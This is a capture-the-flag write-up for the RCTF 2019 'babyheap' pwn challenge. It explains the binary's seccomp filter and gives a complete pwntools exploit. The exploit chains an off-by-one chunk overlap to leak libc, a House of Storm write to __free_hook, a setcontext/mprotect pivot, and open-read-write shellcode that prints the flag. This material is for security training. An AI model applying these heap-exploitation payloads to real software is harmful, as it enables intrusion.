
---
title: RCTF2019_Babyheap
date: 2019-05-21 08:24:45
tags: House_Of_Storm
---
The only One Pwn challenge I solved In RCTF ...TCL QAQ 
<!--more-->

# Start
* I am struggling to finish my write_up with my poor English...
* This challenge combined `House_of_storm` And `Seccompt`
* I shoul pwn it earlier , I wasted too much time on passby the SECCOMP to get a shell (In Fact I can Just cat the flag...)
# House of Storm
It is amazing .
I have wrote a essay about it [LINK][1]
# Seccomp
there  are some limitations in this challenge 
* seccomp
```c
➜  babyheapp seccomp-tools dump ./babyheap  
line  CODE  JT   JF      K
=================================
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
0002: 0x06 0x00 0x00 0x00000000  return KILL
0003: 0x20 0x00 0x00 0x00000000  A = sys_number
0004: 0x15 0x00 0x01 0x00000029  if (A != socket) goto 0006
0005: 0x06 0x00 0x00 0x00000000  return KILL
0006: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0008
0007: 0x06 0x00 0x00 0x00000000  return KILL
0008: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0010
0009: 0x06 0x00 0x00 0x00000000  return KILL
0010: 0x15 0x00 0x01 0x0000009d  if (A != prctl) goto 0012
0011: 0x06 0x00 0x00 0x00000000  return KILL
0012: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0014
0013: 0x06 0x00 0x00 0x00000000  return KILL
0014: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0016
0015: 0x06 0x00 0x00 0x00000000  return KILL
0016: 0x15 0x00 0x01 0x0000003e  if (A != kill) goto 0018
0017: 0x06 0x00 0x00 0x00000000  return KILL
0018: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0020
0019: 0x06 0x00 0x00 0x00000000  return KILL
0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```
So we can not call get a shell directly.
But luckily , We have open & read & write....
and we can just get flag by open+read+write
# setcontext

[usage of setcontext][2]

# Solution
* #1Off_By_One(shrink)  ===> overlap ===> Leak  libc
```python
add(0x500)#0
add(0x88)#1
add(0x88)#2
free(0)
add(0x18)#0
edit(0,"A"*0x18)
add(0x88)#3
add(0x88)#4
free(3)
free(1)
add(0x2d8)#1
add(0x88)#3
add(0x48)#5
free(4)
show(5)
#0x47b75+base
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b78-0x7ffff7a0d000)
libc.address=base
log.warning(hex(base))
```
* clear unsorted bin ptr
`add(0x458+0x90)#4`
* do step#1 again to set `__free_hook` by   [`House of storm`][1]
```python
aim=libc.sym['__free_hook']
bk=aim-0x20+8
bk_nextsize=aim-0x20-0x18-5
add(0x500)#6
add(0x88)#7
add(0x88)#8
free(6)
add(0x18)#6
edit(6,"A"*0x18)
add(0x88)#9
add(0x88)#10
free(9)
free(7)
add(0x2d8)#7
add(0x78)#9
add(0x48)#11
add(0x4a9)#12
edit(10,p64(0)*7+p64(0x4a1)+p64(0)+p64(bk)+p64(0)+p64(bk_nextsize))#edit the head of LARGECHUNK
edit(11,p64(0)+p64(0x21)*7)
free(10)
edit(11,p64(0)+p64(0x4b1)+p64(0)+p64(aim-0x20))#edit the head & bk of UNSORTEDCHUNK
add(0x48)#10
```
* Now we can Run our Shellcode by `setcontext+0x35` + `mprotect`
```python
magic=libc.sym['__free_hook']+0x8
# read + mprotect 
top='''
mov rdx,0x1234000
mov al,9
mov rdi,rdx
jmp .+0x14
'''
shellcode='''
mov rsi,0x1000
mov dx,0x7
mov r10,0x22
syscall
mov rsi,rax
xchg r9,rax
mov rdi,rax
syscall
push 0x1234000
ret
'''
edit(10,asm(top).ljust(0x10,'\x00')+p64(base+0x47b75)+p64(magic-0x18)+asm(shellcode))
#payload for setcontext
payload=p64(0x7ffff7b15e89-0x7ffff7a3b000+base)+p64(0x7ffff7a7d4d5-0x7ffff7a3b000+base)+p64(0)
payload=payload.ljust(0x28,'\x00')+p64(0xfffffffffffffff)+p64(0)
payload=payload.ljust(0x68,'\x00')+p64(magic&0xffffffffffff000)+p64(0x1000)
payload=payload.ljust(0x88,'\xff')+p64(0x7)
payload=payload.ljust(0xa0,'\x00')+p64(magic)+p64(libc.sym['mprotect'])
edit(12,payload)
free(12)
```

* open+read+write
```python
sh='''
mov rsp,0x1234400
mov rax,2
mov rdi,0x67616c662f2e
push rdi
mov rdi,rsp
mov rsi,0
mov rdx,0
syscall
mov rdi,rax
mov rax,0
mov rsi,0x1234500
mov rdx,0x100
syscall
mov rax,1
mov rdi,1
mov rsi,0x1234500
mov rdx,0x100
syscall
'''
sh=asm(sh)
p.send(sh)
```

..I try to shrink the length of my shellcode,So that I can finish my exp in chunk_12.emmm, but I just wasted a lot of time and failed for unknow reason....
so I have to have more space to write my shellcode to locate the problem ...but I ... get the flag ...

# exp
```python
from pwn import *
def cmd(c):
p.sendlineafter(": \n",str(c))
def add(size):
cmd(1)
p.sendlineafter("ize: ",str(size))

def edit(idx,c):
cmd(2)
p.sendlineafter("dex: ",str(idx))
p.sendafter("tent: ",c)
def free(idx):
cmd(3)
p.sendlineafter("dex: ",str(idx))
def show(idx):
cmd(4)
p.sendlineafter("dex: ",str(idx))
context.arch='amd64'

libc=ELF("./libc-2.23.so")
#p=remote("123.206.174.203",20001)

p=process('./babyheap')
#House of Storm
add(0x500)#0
add(0x88)#1
add(0x88)#2
free(0)
add(0x18)#0
edit(0,"A"*0x18)
add(0x88)#3
add(0x88)#4
free(3)
free(1)
add(0x2d8)#1
add(0x88)#3
add(0x48)#5
free(4)
show(5)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b78-0x7ffff7a0d000)
libc.address=base
log.warning(hex(base))
#get libc base
add(0x458+0x90)#4
#clear main_arena

aim=libc.sym['__free_hook']
bk=aim-0x20+8
bk_nextsize=aim-0x20-0x18-5
add(0x500)#6
add(0x88)#7
add(0x88)#8
free(6)
add(0x18)#6
edit(6,"A"*0x18)
add(0x88)#9
add(0x88)#10
free(9)
free(7)
add(0x2d8)#7
add(0x78)#9
add(0x48)#11
add(0x4a9)#12
edit(10,p64(0)*7+p64(0x4a1)+p64(0)+p64(bk)+p64(0)+p64(bk_nextsize))#edit the head of LARGECHUNK
edit(11,p64(0)+p64(0x21)*7)
free(10)
edit(11,p64(0)+p64(0x4b1)+p64(0)+p64(aim-0x20))#edit the head & bk of UNSORTEDCHUNK
add(0x48)#10
#House of Storm


# setcontext 
magic=libc.sym['__free_hook']+0x8
top='''
mov rdx,0x1234000
mov al,9
mov rdi,rdx
jmp .+0x14
'''
shellcode='''
mov rsi,0x1000
mov dx,0x7
mov r10,0x22
syscall
mov rsi,rax
xchg r9,rax
mov rdi,rax
syscall
push 0x1234000
ret
'''
edit(10,asm(top).ljust(0x10,'\x00')+p64(base+0x47b75)+p64(magic-0x18)+asm(shellcode))
payload=p64(0x7ffff7b15e89-0x7ffff7a3b000+base)+p64(0x7ffff7a7d4d5-0x7ffff7a3b000+base)+p64(0)
payload=payload.ljust(0x28,'\x00')+p64(0xfffffffffffffff)+p64(0)
payload=payload.ljust(0x68,'\x00')+p64(magic&0xffffffffffff000)+p64(0x1000)
payload=payload.ljust(0x88,'\xff')+p64(0x7)
payload=payload.ljust(0xa0,'\x00')+p64(magic)+p64(libc.sym['mprotect'])
edit(12,payload)
free(12)
# setcontext 



# Show time
context.log_level='debug'
sh='''
mov rsp,0x1234400
mov rax,2
mov rdi,0x67616c662f2e
push rdi
mov rdi,rsp
mov rsi,0
mov rdx,0
syscall
mov rdi,rax
mov rax,0
mov rsi,0x1234500
mov rdx,0x100
syscall
mov rax,1
mov rdi,1
mov rsi,0x1234500
mov rdx,0x100
syscall
'''
sh=asm(sh)
p.send(sh)
p.interactive()
```

# _
It's a Challenge which combined  
Storm:
`https://n132.github.io/2019/05/07/2019-05-07-House-of-Storm/`

setcontext:
`https://n132.github.io/2019/05/10/2019-05-08-Startctf2019-Heap-master/#setcontext()`

calc(pwnable.tw):
`https://n132.github.io/2019/01/18/2019-01-18-pwnable-tw-Trip/#calc`



[1]: https://n132.github.io/2019/05/07/2019-05-07-House-of-Storm/
[2]: https://n132.github.io/2019/05/10/2019-05-08-Startctf2019-Heap-master/#setcontext()
